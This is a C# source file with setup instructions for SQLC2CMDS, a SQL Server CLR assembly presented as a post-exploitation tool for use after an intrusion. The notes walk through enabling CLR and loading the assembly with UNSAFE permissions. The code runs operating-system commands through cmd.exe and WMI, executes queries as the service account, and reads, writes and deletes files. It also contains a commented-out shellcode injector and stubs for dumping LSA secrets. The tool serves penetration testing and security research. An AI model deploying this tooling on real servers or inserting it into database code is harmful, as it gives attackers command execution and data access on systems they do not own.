/* 

Author: Scott Sutherland, NetSPI (2018)
Application: SQLC2CMDS.dll
Description: 

This .net DLL is intended to be imported into SQL Server and used during post exploitation activities.  
However, it could also be used for legitimate purposes. Long term this is intended to be the core 
set of functions used by the SQLC2 project being roled into PowerUpSQL.

It currently supports:
* TSQL queries as current user
* TSQL queries as the service account (implicitly sysadmin)
* Executing commands via C# wrapper / WMI
* Read/Write/Remove text files
* Encryption/Decryption of strings using AES 

Pending functions:
* Read/Write binary files
* Read/Write to registry
* Run powershell commands without powershell.exe
* Modify query functions too accept remote server target
* Shellcode injection
* Dumping LSA Secrets
* POST/GET data from a remote web server
* Download and execute script from a web server
* Upload / Download file functions for SQLC2

Additional Instructions:

1. Compile the DLL. Below is an example.  However, be aware that this we written and testing using the .net 4 CLR. 
   For more information on CLR versions visit: https://docs.microsoft.com/en-us/dotnet/framework/migration-guide/versions-and-dependencies
 
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /Reference:C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Management.dll SQLC2CMDS.cs 
   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library  SQLC2CMDS.cs 

2. Enale CLR on the server and select the MSDB database.  MSDB data base is flagged as trustworthy by default which is a requirement for using CLRs in SQL Server.

    -- Select the msdb database
    use msdb

    -- Enable show advanced options on the server
    sp_configure 'show advanced options',1
    RECONFIGURE
    GO

    -- Enable clr on the server
    sp_configure 'clr enabled',1
    RECONFIGURE
    GO

3. As a sysadmin import SQLC2CMDS.dll.

    -- Import the assembly
    CREATE ASSEMBLY SQLC2CMDS
    FROM 'c:\temp\SQLC2CMDS.dll'
    WITH PERMISSION_SET = UNSAFE;

4. Map the SQLC2CMDS to stored procedures.

    CREATE PROCEDURE [dbo].[run_query] @execTsql NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_query]; 
    GO
    CREATE PROCEDURE [dbo].[run_query2] @execTsql NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_query2]; 
    GO
    CREATE PROCEDURE [dbo].[run_command] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_command]; 
    GO
    CREATE PROCEDURE [dbo].[run_command_wmi] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_command_wmi]; 
    GO
    CREATE PROCEDURE [dbo].[run_shellcode] @execShellcode NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[run_shellcode]; 
    GO
    CREATE PROCEDURE [dbo].[write_file] @filePath NVARCHAR (4000),@fileContent NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[write_file]; 
    GO
    CREATE PROCEDURE [dbo].[read_file] @filePath NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[read_file]; 
    GO
    CREATE PROCEDURE [dbo].[remove_file] @filePath NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[remove_file]; 
    GO
    CREATE PROCEDURE [dbo].[EncryptThis] @MyString NVARCHAR (4000),@MyKey NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[EncryptThis]; 
    GO
    CREATE PROCEDURE [dbo].[DecryptThis] @MyString NVARCHAR (4000),@MyKey NVARCHAR (4000) AS EXTERNAL NAME [SQLC2CMDS].[StoredProcedures].[DecryptThis]; 
    GO

5. Run tests for each of the available stored procedure.

    -- Runs as the current user
    run_query 'select system_user' 
    run_query 'select * from master..sysdatabases'

    -- Runs as the service account
    run_query2 'select system_user'
    run_query2 'select * from master..sysdatabases'

    -- Runs with output
    run_command 'whoami'

    -- Runs without output
    run_command_wmi 'c:\windows\system32\cmd.exe /c "whoami > c:\temp\doit1.txt"'
    
    -- Write text to a file
    write_file 'c:\temp\blah21.txt','stuff2'

    -- Read text from a file
    read_file 'c:\temp\blah21.txt'

    -- Remove a file
    remove_file 'c:\temp\blah21.txt'

    -- Encrypt a string with provided key
    encryptthis 'hello','password'

    -- Decrypt an encrypted string with provided key
    decryptthis 'EAAAAIUSQtbiDvP3c8L/fuNoQ8q/zUwMD8Cd/UbCmiVnopTX','password'

5. Remove all added stored procedures and the SQLC2CMDS assembly.

    drop procedure run_query
    drop procedure run_query2
    drop procedure run_command
    drop procedure run_command_wmi
    drop procedure run_shellcode
    drop procedure write_file
    drop procedure read_file
    drop procedure remove_file
    drop procedure encryptthis
    drop procedure decryptthis
    drop assembly SQLC2CMDS
 */

using System;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Data;
using System.Data.SqlClient;
using System.Data.SqlTypes;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
//using System.Management.Automation;
//using System.Management.Automation.Runspaces;
//using System.Management.Automation.Internal;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Microsoft.SqlServer.Server;



// --------------------------------------------------
// Class for converting clr system.type to sqldbtype 
// Source: https://stackoverflow.com/questions/35745226/net-system-type-to-sqldbtype
// --------------------------------------------------
public static class SqlHelper
{
    private static Dictionary<Type, SqlDbType> typeMap;

    // Create and populate the dictionary in the static constructor in mappings may be wrong
    static SqlHelper()
    {
        typeMap = new Dictionary<Type, SqlDbType>();

        typeMap[typeof(string)]         = SqlDbType.NVarChar;
        typeMap[typeof(char[])]         = SqlDbType.NVarChar;
        typeMap[typeof(byte)]           = SqlDbType.TinyInt;
        typeMap[typeof(byte[])]         = SqlDbType.Image;        
        //typeMap[typeof(sbyte)]        = SqlDbType.TinyInt; - not sure of sqldbtype
        //typeMap[typeof(ushort)]       = SqlDbType.TinyInt; - not sure of sqldbtype
        //typeMap[typeof(uint)]         = SqlDbType.TinyInt; - not sure of sqldbtype
        //typeMap[typeof(ulong)]        = SqlDbType.TinyInt; - not sure of sqldbtype   
        //typeMap[typeof(DateSpan)]     = SqlDbType.TinyInt; - not sure of sqldbtype              
        typeMap[typeof(short)]          = SqlDbType.SmallInt;
        typeMap[typeof(int)]            = SqlDbType.Int;
        typeMap[typeof(long)]           = SqlDbType.BigInt;
        typeMap[typeof(bool)]           = SqlDbType.Bit;
        typeMap[typeof(DateTime)]       = SqlDbType.DateTime2;
        typeMap[typeof(DateTimeOffset)] = SqlDbType.DateTimeOffset;
        typeMap[typeof(decimal)]        = SqlDbType.Money;
        typeMap[typeof(float)]          = SqlDbType.Real;
        typeMap[typeof(double)]         = SqlDbType.Float;
        typeMap[typeof(TimeSpan)]       = SqlDbType.Time;
    }

    // Non-generic argument-based method
    public static SqlDbType GetDbType(Type giveType)
    {
        // Allow nullable types to be handled
        giveType = Nullable.GetUnderlyingType(giveType) ?? giveType;

        if (typeMap.ContainsKey(giveType))
        {
            return typeMap[giveType];
        }

        throw new ArgumentException("is not a supported .NET class");
    }

    // Generic version
    public static SqlDbType GetDbType<T>()
    {
        return GetDbType(typeof(T));
    }
}


// --------------------------------------------------
// Class for most of the SQLC2CMDS stored procedures
// --------------------------------------------------
public partial class StoredProcedures
{

    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Common functions //////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////////////////////

    // --------------------------------------------------
    // Function - run_query
    // --------------------------------------------------
    // https://msdn.microsoft.com/en-us/library/9197xfyw(v=vs.110).aspx
    // https://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnectionstringbuilder(v=vs.110).aspx
    // No error handling when object does not exist
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_query (SqlString execTsql)
    {
        // Run as calling SQL/Windows login    
        using(SqlConnection connection = new SqlConnection("context connection=true"))   
        {  
            connection.Open();  
            SqlCommand command = new SqlCommand(execTsql.ToString(), connection);  
            SqlContext.Pipe.ExecuteAndSend(command);   
            connection.Close();  
        }            
    }

    // --------------------------------------------------
    // Function - run_query2 
    // --------------------------------------------------
    // https://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader(v=vs.80).aspx
    // https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/retrieving-data-using-a-datareader
    // https://msdn.microsoft.com/en-us/library/microsoft.sqlserver.server.sqldatarecord(v=vs.110).aspx
    // http://sharpfellows.com/post/Returning-a-DataTable-over-SqlContextPipe
    // https://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqldatareader.getvalues(v=vs.110).aspx
    // Need to add auto identification of the current instance.
    // No error handling when object does not exist. Need to add variables so it can be used as an alternative to ad-hoc queries.
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_query2 (SqlString execTsql)
    {

        // user connection string builder here, accept query, server, current, user, password - execute as system by default, accept windows creds, sql creds

        // Connection string
        using (SqlConnection connection = new SqlConnection(@"Data Source=MSSQLSRV04\SQLSERVER2014;Initial Catalog=master;Integrated Security=True"))
        {
            connection.Open();
            SqlCommand command = new SqlCommand(execTsql.ToString(), connection);
            command.CommandTimeout = 240;
            SqlDataReader reader = command.ExecuteReader();

            // Create List for Columns
            List<SqlMetaData> OutputColumns = new List<SqlMetaData>(reader.FieldCount); 

            // Get schema
            DataTable schemaTable = reader.GetSchemaTable();            

            // Get column names, types, and sizes from reader
            for(int i=0;i<reader.FieldCount;i++)
            {       
                // Check if char and string types
                if(typeof(char).Equals(reader.GetFieldType(i)) || typeof(string).Equals(reader.GetFieldType(i)))
                {
                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i),SqlHelper.GetDbType(reader.GetFieldType(i)),4000); 
                    OutputColumns.Add(OutputColumn); 
                }else{

                    // Anything other type
                    SqlMetaData OutputColumn = new SqlMetaData(reader.GetName(i),SqlHelper.GetDbType(reader.GetFieldType(i))); 
                    OutputColumns.Add(OutputColumn); 
                }  
            }                   

            // Create the record and specify the metadata for the columns.
            SqlDataRecord record = new SqlDataRecord(OutputColumns.ToArray());

            // Mark the begining of the result-set.
            SqlContext.Pipe.SendResultsStart(record);
           
           // Check for rows
           if (reader.HasRows)
           {                
                while (reader.Read())
                {    
                    // Iterate through column count, set value for each column in row
                    for (int i = 0; i < reader.FieldCount; i++)
                    {
                        // Add value to the current row/column
                        record.SetValue(i, reader[i]);  
                    }

                    // Send the row back to the client.
                    SqlContext.Pipe.SendResultsRow(record);   
                } 

           }else{    

                // Set values for each column in the row
                record.SetString(0,"No rows found.");

                // Send the row back to the client.
                SqlContext.Pipe.SendResultsRow(record);                  
           }

            // Mark the end of the result-set.
            SqlContext.Pipe.SendResultsEnd(); 

            connection.Close();
        }          
    }
    
    // --------------------------------------------------
    // Function - run_command
    // --------------------------------------------------     
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_command (SqlString execCommand)
    {
        Process proc = new Process();
        proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
        proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
        proc.StartInfo.UseShellExecute = false;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.Start();

        // Create the record and specify the metadata for the columns.
	    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	    // Mark the begining of the result-set.
	    SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
	    record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());

        // Send the row back to the client.
	    SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();

        proc.WaitForExit();
        proc.Close();
    }

    // --------------------------------------------------
    // Function - run_command_wmi
    // -------------------------------------------------- 
    // Add remote server option.
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_command_wmi (SqlString execCommand)
    {
        object[] theProcessToRun = {execCommand};
        ManagementClass mClass = new ManagementClass(@"\\" + "127.0.0.1" + @"\root\cimv2:Win32_Process");
        mClass.InvokeMethod("Create", theProcessToRun);
        
        // Create the record and specify the metadata for the columns.
	    SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

	    // Mark the begining of the result-set.
	    SqlContext.Pipe.SendResultsStart(record);

        // Set values for each column in the row
	    record.SetString(0, "WMI command executed");

        // Send the row back to the client.
	    SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();
    }    

    // add wrapper for c++ code in c#
    // https://andrearegoli.wordpress.com/2013/09/10/shellexecute-and-execute-file-in-c/


    // --------------------------------------------------
    // Function - write_file
    // -------------------------------------------------- 
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void write_file (SqlString filePath,SqlString fileContent)
    {
        // Write provided file content to provided file path
        System.IO.File.AppendAllText(filePath.Value, fileContent.Value);    

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

        // Mark the begining of the result-set.
        SqlContext.Pipe.SendResultsStart(record);        

        // This text is added only once to the file.
        if (File.Exists(filePath.Value))
        {
            // Set values for each column in the row
            record.SetString(0, "Conent was written.");
        }else{

            // Set values for each column in the row
            record.SetString(0, "Conent was written.");            
        }       

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();        
    }

    // --------------------------------------------------
    // Function - read_file
    // -------------------------------------------------- 
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void read_file (String filePath)
    {
        // https://msdn.microsoft.com/en-us/library/ms143368(v=vs.110).aspx

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

        // Mark the begining of the result-set.
        SqlContext.Pipe.SendResultsStart(record); 

        // This text is added only once to the file.
        if (File.Exists(filePath))
        {      
            // Open the file to read from.
            string readText = File.ReadAllText(filePath);
    
            // Write output
            record.SetString(0, readText.ToString());  
        }else{
             record.SetString(0, "The file does not exist.");  
        }

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();                    
    }    

    // --------------------------------------------------
    // Function - remove_file
    // -------------------------------------------------- 
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void remove_file (String filePath)
    {
        // https://msdn.microsoft.com/en-us/library/ms143368(v=vs.110).aspx

        // Create the record and specify the metadata for the columns.
        SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

        // Mark the begining of the result-set.
        SqlContext.Pipe.SendResultsStart(record); 

        // This text is added only once to the file.
        if (File.Exists(filePath))
        {      
            // Attempt to remove the file
            try{                
                File.Delete(filePath);
                record.SetString(0, "The file was removed.");  
            }catch{
                record.SetString(0, "The file could not be removed.");  
            }
        }else{
             record.SetString(0, "The file does not exist.");  
        }

        // Send the row back to the client.
        SqlContext.Pipe.SendResultsRow(record);

        // Mark the end of the result-set.
        SqlContext.Pipe.SendResultsEnd();                    
    }      

    // --------------------------------------------------
    // Marshaling Native Functions
    // https://msdn.microsoft.com/en-us/library/ms235282.aspx
    // --------------------------------------------------    
    private static Int32 MEM_COMMIT = 0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE = (IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UIntPtr size, Int32 flAllocationType, IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr param, Int32 dwCreationFlags, ref IntPtr lpThreadId);

    // --------------------------------------------------
    // Function - run_shellcode - Needs more testing - crashes service
    // --------------------------------------------------   

    // https://raw.githubusercontent.com/OJ/metasploit-framework/1c62559e55e9f4e755051c7836d0e23e856a4dad/external/source/SqlClrPayload/StoredProcedures.cs
    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_shellcode(string base64EncodedPayload)
    {
        /* 
        var bytes = Convert.FromBase64String(base64EncodedPayload);
        var mem = VirtualAlloc(IntPtr.Zero,(UIntPtr)bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(bytes, 0, mem, bytes.Length);
        var threadId = IntPtr.Zero;
        CreateThread(IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, ref threadId);
        */
    }     

    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Crypto functions //////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////////////////////         

        // --------------------------------------------------
        // Function: EncryptThis
        // --------------------------------------------------  
        // Source: https://stackoverflow.com/questions/202011/encrypt-and-decrypt-a-string
        // Reference: https://msdn.microsoft.com/en-us/library/system.security.cryptography.aes(v=vs.110).aspx
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void EncryptThis (SqlString MyString,SqlString MyKey)
        {           
            try
            {
                string encrypted64 = EncryptStringAES(string.Format(MyString.Value),string.Format(MyKey.Value));
        
                // Create the record and specify the metadata for the columns.
                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

                // Mark the begining of the result-set.
                SqlContext.Pipe.SendResultsStart(record);

                // Set values for each column in the row
                record.SetString(0, encrypted64);

                // Send the row back to the client.
                SqlContext.Pipe.SendResultsRow(record);

                // Mark the end of the result-set.
                SqlContext.Pipe.SendResultsEnd();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: {0}", e.Message);
            }					
        }

        // --------------------------------------------------
        // Function: DecryptThis
        // --------------------------------------------------                 
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void DecryptThis (SqlString MyString, SqlString MyKey)
        {           
            try
            {
                string decrypted = DecryptStringAES(string.Format(MyString.Value),string.Format(MyKey.Value));
        
                // Create the record and specify the metadata for the columns.
                SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));

                // Mark the begining of the result-set.
                SqlContext.Pipe.SendResultsStart(record);

                // Set values for each column in the row
                record.SetString(0, decrypted);

                // Send the row back to the client.
                SqlContext.Pipe.SendResultsRow(record);

                // Mark the end of the result-set.
                SqlContext.Pipe.SendResultsEnd();
            }
            catch (Exception e)
            {
                Console.WriteLine("Error: {0}", e.Message);
            }					
        }	

        // Set salt - May not want the salt to be static long term :P
        private static byte[] _salt = Encoding.Unicode.GetBytes("CaptainSalty");

        public static string EncryptStringAES(string plainText, string sharedSecret)
        {
            if (string.IsNullOrEmpty(plainText))
                throw new ArgumentNullException("plainText");
            if (string.IsNullOrEmpty(sharedSecret))
                throw new ArgumentNullException("sharedSecret");

            string outStr = null;                       // Encrypted string to return
            RijndaelManaged aesAlg = null;              // RijndaelManaged object used to encrypt the data.

            try
            {
                // generate the key from the shared secret and the salt
                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                // Create a RijndaelManaged object
                aesAlg = new RijndaelManaged();
                aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                aesAlg.Mode = CipherMode.ECB;

                // Create a decryptor to perform the stream transform.
                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                // Create the streams used for encryption.
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    // prepend the IV
                    msEncrypt.Write(BitConverter.GetBytes(aesAlg.IV.Length), 0, sizeof(int));
                    msEncrypt.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            //Write all data to the stream.
                            swEncrypt.Write(plainText);
                        }
                    }
                    outStr = Convert.ToBase64String(msEncrypt.ToArray());
                }
            }
            finally
            {
                // Clear the RijndaelManaged object.
                if (aesAlg != null)
                    aesAlg.Clear();
            }

            // Return the encrypted bytes from the memory stream.
            return outStr;
        }

        public static string DecryptStringAES(string cipherText, string sharedSecret)
        {
            if (string.IsNullOrEmpty(cipherText))
                throw new ArgumentNullException("cipherText");
            if (string.IsNullOrEmpty(sharedSecret))
                throw new ArgumentNullException("sharedSecret");

            // Declare the RijndaelManaged object
            // used to decrypt the data.
            RijndaelManaged aesAlg = null;

            // Declare the string used to hold
            // the decrypted text.
            string plaintext = null;

            try
            {
                // generate the key from the shared secret and the salt
                Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(sharedSecret, _salt);

                // Create the streams used for decryption.                
                byte[] bytes = Convert.FromBase64String(cipherText);
                using (MemoryStream msDecrypt = new MemoryStream(bytes))
                {
                    // Create a RijndaelManaged object
                    // with the specified key and IV.
                    aesAlg = new RijndaelManaged();
                    aesAlg.Key = key.GetBytes(aesAlg.KeySize / 8);
                    aesAlg.Mode = CipherMode.ECB;
                    
                    // Get the initialization vector from the encrypted stream
                    aesAlg.IV = ReadByteArray(msDecrypt);
                    // Create a decrytor to perform the stream transform.
                    ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))

                            // Read the decrypted bytes from the decrypting stream
                            // and place them in a string.
                            plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
            finally
            {
                // Clear the RijndaelManaged object.
                if (aesAlg != null)
                    aesAlg.Clear();
            }

            return plaintext;
        }

        private static byte[] ReadByteArray(Stream s)
        {
            byte[] rawLength = new byte[sizeof(int)];
            if (s.Read(rawLength, 0, rawLength.Length) != rawLength.Length)
            {
                throw new SystemException("Stream did not contain properly formatted byte array");
            }

            byte[] buffer = new byte[BitConverter.ToInt32(rawLength, 0)];
            if (s.Read(buffer, 0, buffer.Length) != buffer.Length)
            {
                throw new SystemException("Did not read byte array properly");
            }

            return buffer;
        }		    

    //////////////////////////////////////////////////////////////////////////////////////////////////////
    // Pending functions /////////////////////////////////////////////////////////////////////////////////
    //////////////////////////////////////////////////////////////////////////////////////////////////////       

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void read_file_bin (SqlString filePath)
    {
        // Read binary file contents 
        // https://gist.github.com/nullbind/34c63d169fadb213753c6d94567ba85c
    }           

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void write_file_bin (SqlString filePath,SqlString fileContent)
    {

        // Write binary file content to provided file path
        // https://gist.github.com/nullbind/34c63d169fadb213753c6d94567ba85c 
    }       

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void read_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty)
    {

    }            

     [Microsoft.SqlServer.Server.SqlProcedure]
    public static void write_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty)
    {

    }      

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void write_registry_property (SqlString regPath,SqlString regKey,SqlString regProperty,SqlString regValue)
    {

    }            

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void run_command_ps (SqlString PsCode)
    {

    }  

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void send_http_post (SqlString PostRequest)
    {

    }   

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void send_http_get (SqlString GetRequest)
    {

    }         

    [Microsoft.SqlServer.Server.SqlProcedure]
    public static void get_lsa_secrets (SqlString GetRequest)
    {

    }                     
};
